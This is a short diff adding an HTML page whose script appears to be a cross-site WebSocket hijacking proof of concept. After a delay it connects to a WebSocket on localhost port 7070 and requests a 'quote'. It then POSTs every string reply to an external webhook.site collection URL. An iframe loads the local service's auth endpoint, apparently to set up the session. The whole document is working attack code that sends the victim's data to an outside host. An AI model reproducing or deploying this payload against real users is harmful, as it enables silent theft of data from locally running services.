@@ -1,0 +1,29 @@
+<script type="text/javascript">
+function stage2() {
+    var host = "ws://localhost:7070/quote";
+    socket = new WebSocket(host);
+    try {
+
+        socket.onopen = function(msg) {
+            console.log(msg);
+            socket.send("getquote");
+            // alert("连接成功！");
+        };
+
+        socket.onmessage = function(msg) {
+            if (typeof msg.data == "string") {
+                fetch('https://webhook.site/63c8e90e-e0c6-4cfb-ada3-ddce701e76ba',{method: 'POST',body: JSON.stringify({'data':msg.data})});
+            } else {
+                return;
+            }
+        };
+        socket.onclose = function(msg) {
+            return;
+        };
+    } catch (ex) {
+        log(ex);
+    }
+}
+setTimeout(function(){stage2();},1500);
+</script>
+<iframe src="http://localhost:7070/auth"></iframe>
